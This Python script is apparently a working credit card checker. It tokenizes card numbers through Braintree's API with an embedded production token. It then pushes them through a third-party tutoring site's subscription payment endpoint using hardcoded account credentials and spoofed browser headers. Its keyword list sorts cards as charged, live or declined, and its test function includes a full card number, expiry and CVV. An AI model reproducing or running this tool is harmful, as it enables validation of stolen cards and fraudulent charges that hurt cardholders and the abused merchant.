import requests
import json
import os

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BRAINTREE_JWT_TOKEN = os.environ.get("BRAINTREE_BEARER_TOKEN", "eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjUxMTQ5MjMsImp0aSI6ImQ1ZjMxMDBlLWQ4ODctNGUyMi1hN2NjLWM5ZjI2ZDFiODViMSIsInN1YiI6Ijd6cGJtcTZoYjljZ3NuY2oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijd6cGJtcTZoYjljZ3NuY2oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsicGF5cGFsX2NsaWVudF9pZCI6IkFaZ0NQdUpnZEQxNS1vUkFWZG5remYtbW0yU3dPc2lrZ1dMN2dKYXRnQ2ZYMFRIU1NvTkdSdWtVVHE5dnBmQWlWRkhKV1hUWnRDTmlMcjJKIn19.r9BfFsr_a0T8TcouGFWg3DepRcS_D-KPZLk6G7kdFt5YpQN5dP1eTGawJoXjPsub5yB-Kj7K98G54B5CJpchMg")
BRAINTREE_SIMPLE_TOKEN = "production_7byc9bhr_7zpbmq6hb9cgsncj"
READABILITY_TOKEN = "1C0ECE8B-630E-46BD-8689-EA42CBF0E21B"


def check_card(cc_number, exp_month, exp_year, cvv):
    """Check a single card via Braintree - returns RAW API response"""
    if len(exp_year) == 2:
        exp_year = f"20{exp_year}"
    
    try:
        tokenize_result = tokenize_card_dynamic(cc_number, exp_month, exp_year, cvv)
        
        if 'error' in tokenize_result:
            return {
                'status': 'ERROR',
                'message': tokenize_result['error'],
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': tokenize_result['error']
            }
        
        raw_tokenize = tokenize_result.get('raw_text', '')
        
        try:
            token_json = json.loads(raw_tokenize)
            
            if 'errors' in token_json and token_json['errors']:
                error_msg = token_json['errors'][0].get('message', raw_tokenize)
                return {
                    'status': 'DECLINED',
                    'message': error_msg,
                    'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                    'raw_response': raw_tokenize
                }
            
            token = token_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        except:
            return {
                'status': 'ERROR',
                'message': raw_tokenize[:200] if raw_tokenize else 'Invalid tokenize response',
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_tokenize
            }
        
        if not token:
            return {
                'status': 'ERROR',
                'message': 'No token received',
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_tokenize
            }
        
        payment_result = submit_payment_dynamic(token)
        
        if 'error' in payment_result:
            return {
                'status': 'ERROR',
                'message': payment_result['error'],
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': payment_result['error']
            }
        
        raw_payment = payment_result.get('raw_text', '')
        
        try:
            clean_raw = raw_payment.strip()
            if clean_raw.startswith('"') and clean_raw.endswith('"'):
                clean_raw = json.loads(clean_raw)
            
            if isinstance(clean_raw, str):
                response_data = json.loads(clean_raw)
            else:
                response_data = json.loads(raw_payment) if isinstance(raw_payment, str) else raw_payment
        except:
            return {
                'status': 'DECLINED',
                'message': raw_payment[:200] if raw_payment else 'Invalid payment response',
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_payment
            }
        
        raw_message = response_data.get('message', '') or response_data.get('Message', '') or ''
        status_code = response_data.get('statuscode', response_data.get('StatusCode', -1))
        
        live_card_keywords = [
            'insufficient funds',
            'insufficient fund',
            'cvv',
            'cvc',
            'security code',
            'avs',
            'address verification',
            'postal code',
            'zip code',
        ]
        
        msg_lower = raw_message.lower()
        
        if status_code == 0 or response_data.get('Success') == True or response_data.get('success') == True:
            return {
                'status': 'CHARGED',
                'message': raw_message if raw_message else 'Charged Successfully',
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_payment
            }
        elif any(keyword in msg_lower for keyword in live_card_keywords):
            return {
                'status': 'APPROVED',
                'message': raw_message if raw_message else raw_payment[:200],
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_payment
            }
        else:
            return {
                'status': 'DECLINED',
                'message': raw_message if raw_message else raw_payment[:200],
                'card': f"{cc_number[:6]}****{cc_number[-4:]}",
                'raw_response': raw_payment
            }
        
    except Exception as e:
        return {
            'status': 'ERROR',
            'message': str(e),
            'card': f"{cc_number[:6]}****{cc_number[-4:]}",
            'raw_response': str(e)
        }


def tokenize_card_dynamic(cc_number, exp_month, exp_year, cvv):
    """Tokenize card - returns raw response text"""
    url = "https://payments.braintree-api.com/graphql"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {BRAINTREE_SIMPLE_TOKEN}",
        "Braintree-Version": "2018-05-10",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
    }
    
    payload = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": "03462293-6075-467c-ab18-861ee4ddc345"
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc_number,
                    "expirationMonth": exp_month,
                    "expirationYear": exp_year,
                    "cvv": cvv,
                    "billingAddress": {
                        "postalCode": "99901"
                    }
                },
                "options": {
                    "validate": False
                }
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
        return {
            "status_code": response.status_code,
            "raw_text": response.text,
            "headers": dict(response.headers)
        }
    except Exception as e:
        return {"error": str(e), "raw_text": ""}


def submit_payment_dynamic(nonce):
    """Submit payment - returns raw response text"""
    url = "https://api.readabilitytutor.com/homeselfe.svc/agent/588031/paymentinfo"
    headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "Authorization": "WebAuth",
        "Appmode": "pro",
        "Userid": "588031",
        "Token": READABILITY_TOKEN,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Origin": "https://app.readabilitytutor.com",
        "Referer": "https://app.readabilitytutor.com/",
    }
    
    payload = {
        "agentid": "588031",
        "subscribername": "willam dives",
        "nameoncard": "willam dives",
        "expdate": "",
        "address": "",
        "city": "",
        "state": "",
        "zipcode": "",
        "country": "USA",
        "planid": "annual139",
        "offercode": "",
        "sendwelcomeemail": True,
        "nounce": nonce,
        "trialdays": "30"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=15, verify=False)
        return {
            "status_code": response.status_code,
            "raw_text": response.text,
            "headers": dict(response.headers)
        }
    except Exception as e:
        return {"error": str(e), "raw_text": ""}


def main():
    """Test function"""
    print("Testing Braintree BT Check...")
    result = check_card("5212679625006295", "11", "2030", "694")
    print(f"\nStatus: {result['status']}")
    print(f"Message: {result['message']}")
    print(f"Raw Response: {result.get('raw_response', 'N/A')}")


if __name__ == "__main__":
    main()
